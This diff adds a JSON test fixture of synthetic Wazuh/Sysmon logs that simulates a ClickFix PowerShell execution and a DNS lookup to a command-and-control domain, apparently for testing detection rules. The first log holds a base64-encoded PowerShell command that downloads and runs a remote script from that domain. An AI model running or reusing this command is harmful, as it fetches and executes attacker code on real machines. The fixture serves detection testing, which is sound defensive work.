@@ -1,0 +1,78 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.001",
+    "variation": "001",
+    "name": "IClickFix ClickFix PowerShell Execution",
+    "description": "IClickFix campaign uses ClickFix social engineering via compromised WordPress sites to execute encoded PowerShell",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "source_url": "https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell executing from Run dialog (explorer.exe parent)",
+      "sequence": 1,
+      "log": {
+        "timestamp": "2026-02-03T12:00:00.000Z",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: Encoded PowerShell from Run dialog",
+          "id": "92151",
+          "mitre": {"id": ["T1059.001", "T1204.002"], "tactic": ["Execution"], "technique": ["PowerShell", "Malicious File"]},
+          "groups": ["sysmon", "sysmon_event1", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "decoder": {"name": "windows_eventchannel"},
+        "data": {
+          "win": {
+            "system": {"eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational"},
+            "eventdata": {
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -enc aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAG8AdABvAHQAYQBpAGsAZgBmAGYAawBmAC4AYwBvAG0ALwBmAGYAZgBhAC4AagBzACcAKQApAA==",
+              "user": "CORP\\victim",
+              "parentImage": "C:\\Windows\\explorer.exe",
+              "parentCommandLine": "C:\\Windows\\explorer.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1059.001",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 22 - DNS query to IClickFix C2",
+      "sequence": 2,
+      "log": {
+        "timestamp": "2026-02-03T12:00:01.000Z",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon - Event 22: DNS query to malicious domain",
+          "id": "92160",
+          "mitre": {"id": ["T1071.004"], "tactic": ["Command and Control"], "technique": ["DNS"]},
+          "groups": ["sysmon", "sysmon_event22", "windows"]
+        },
+        "agent": {"id": "007", "name": "WS01", "ip": "10.1.0.20"},
+        "manager": {"name": "wazuh.manager"},
+        "decoder": {"name": "windows_eventchannel"},
+        "data": {
+          "win": {
+            "system": {"eventID": "22", "channel": "Microsoft-Windows-Sysmon/Operational"},
+            "eventdata": {
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "queryName": "ototaikfffkf.com",
+              "queryStatus": "0",
+              "queryResults": "185.234.219.144"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1071.004",
+        "_fomorian_batch": "morning-intel-20260203"
+      }
+    }
+  ]
+}
